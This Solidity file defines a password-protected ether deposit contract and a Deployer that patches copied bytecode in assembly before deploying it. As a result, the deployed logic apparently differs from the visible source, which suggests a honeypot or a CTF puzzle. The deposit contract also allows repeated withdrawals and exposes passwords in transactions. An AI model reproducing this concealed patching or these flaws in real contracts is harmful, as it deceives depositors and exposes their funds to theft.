pragma solidity ^0.4.24;

interface IMerkleDeposit {
    function deposit(bytes32) external payable returns (uint);
    function prove(bytes32, uint) external returns (bool);
}

contract MerkleDeposit {
    
    bytes32[] merkle_hashes;
    uint[] deposit_amounts;
    
    // Pushes 0 into the merkle hash array
    constructor() public {
        merkle_hashes.push(0);
    }
    
    // Allows users to deposit ether into the contract with an encoded password
    function deposit(bytes32 hash) external payable 
    returns (uint deposit_number) {
        // Ensure that value is sent in the transaction
        require(msg.value > 0, &#39;No deposit&#39;);
        // Push the deposit amount to the deposit_amounts array
        deposit_amounts.push(msg.value);
        // Hash the current merkle root with the given hash
        bytes32 merkle_hash = keccak256(abi.encodePacked(merkle_hashes[merkle_hashes.length - 1], hash));
        // Push the hash into the merkle tree
        merkle_hashes.push(merkle_hash);
        // Set the length as the length of the original merkle_hashes array
        deposit_number = merkle_hashes.length - 1;
    }
    
    // Allows users to prove that they know the password to a deposit.
    function prove(bytes32 password, uint deposit_number) external 
    returns (bool) {
        // Reconstruct the hash from the provided data hash
        bytes32 reconstructed_hash = keccak256(abi.encodePacked(password, deposit_amounts[deposit_number - 1]));
        // Reconstruct the root from the reconstructed hash and the given deposit number
        bytes32 reconstructed_root = keccak256(abi.encodePacked(merkle_hashes[deposit_number - 1], reconstructed_hash));
            
        if (reconstructed_root == merkle_hashes[deposit_number]) {
            msg.sender.transfer(deposit_amounts[deposit_number - 1]);
            return true;
        }    
        return false;
    } 
    
}

contract Deployer {
    
    address public deposit;
    
    constructor(bytes32) public payable {
        require(msg.value > 0, &#39;No deposit&#39;);
        address _deposit;
        assembly {
            codecopy(160, 998, 1129)
            codecopy(1289, 2128, 167)
            // Update JUMPDESTs that need to be changed
            mstore8(0x50b, 0x82)
            mstore8(0x534, 0x42)
            mstore8(0x562, 0x78)
            mstore8(0x575, 0x87)
            _deposit := create(0x0, 0xa0, 1296)
        }
        deposit = _deposit;
    }
    
    function make() external {
        new MerkleDeposit();
    }
    
    function prove(bytes32 password, uint deposit_number) external 
    returns (bool success) {
        success = IMerkleDeposit(deposit).prove(password, deposit_number);
        if (success) 
            msg.sender.transfer(address(this).balance);
    }
    
    function () external payable {} 
}